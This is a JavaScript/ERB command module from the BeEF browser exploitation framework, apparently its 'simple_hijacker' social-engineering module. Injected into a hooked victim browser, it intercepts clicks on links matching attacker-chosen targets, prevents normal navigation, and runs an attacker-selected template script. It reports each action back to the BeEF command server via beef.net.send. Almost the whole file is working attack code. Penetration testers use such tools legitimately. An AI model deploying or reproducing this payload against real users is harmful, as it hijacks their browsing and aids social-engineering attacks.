//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

hijack = function(){
    function send(answer){
      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
    }
    <% target = @targets.split(',') %>   
    $j('a').click(function(e) {
      e.preventDefault();
      if ($j(this).attr('href') != '')
      { 
        if( <% target.each{ |href| %> $j(this).attr('href').indexOf("<%=href%>") != -1 <% if href != target.last %> || <% else %> ) <% end %><% } %>{			
          <%
              tplpath = "#{$root_dir}/modules/social_engineering/simple_hijacker/templates/#{@choosetmpl}.js"
              file = File.open(tplpath, "r")
              @template = file.read
          %>
          
          <%= @template %>
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Template "<%= @choosetmpl %>" applied to '+$j(this).attr('href'));
        }
      }
    });
}

beef.execute(function() {
	hijack();
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Hijacker ready, now waits for user action');
});
